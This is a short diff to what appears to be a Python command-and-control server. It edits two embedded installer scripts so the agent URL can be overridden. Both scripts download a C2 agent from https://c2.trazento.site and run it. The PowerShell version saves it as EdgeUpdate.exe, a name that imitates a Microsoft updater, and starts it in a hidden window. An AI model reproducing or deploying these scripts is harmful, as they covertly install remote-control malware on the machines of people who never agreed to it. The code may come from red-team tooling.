@@ -319,7 +319,6 @@ def dashboard():
 # ─── install scripts ─────────────────────────────────────────────────
 INSTALL_SH = r"""#!/bin/sh
 set -e
-SERVER="https://c2.trazento.site"
 echo "[*] C2 Agent installer"
 case "$(uname -s)" in
   Linux)  OS="linux"  ;;
@@ -332,7 +331,7 @@ case "$ARCH" in
   aarch64|arm64) ARCH="aarch64" ;;
   *) echo "unsupported arch: $ARCH"; exit 1 ;;
 esac
-URL="$SERVER/agent/linux/$ARCH"
+URL="${C2_AGENT_URL:-https://c2.trazento.site/agent/linux/$ARCH}"
 echo "[*] Downloading $URL"
 if command -v curl >/dev/null 2>&1; then
   curl -sS -o /tmp/c2_agent "$URL"
@@ -346,11 +345,11 @@ echo "[*] Starting agent..."
 exec /tmp/c2_agent
 """
 
-INSTALL_PS1 = r"""$server = "https://c2.trazento.site"
+INSTALL_PS1 = r"""$url = if ($env:C2_AGENT_URL) { $env:C2_AGENT_URL } else { "https://c2.trazento.site/agent/windows/x86_64" }
 $out = "$env:TEMP\EdgeUpdate.exe"
 Write-Host "[*] Downloading C2 agent..."
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-iwr "$server/agent/windows/x86_64" -OutFile $out
+iwr $url -OutFile $out
 Write-Host "[*] Starting agent..."
 Start-Process -WindowStyle Hidden -FilePath $out
 """
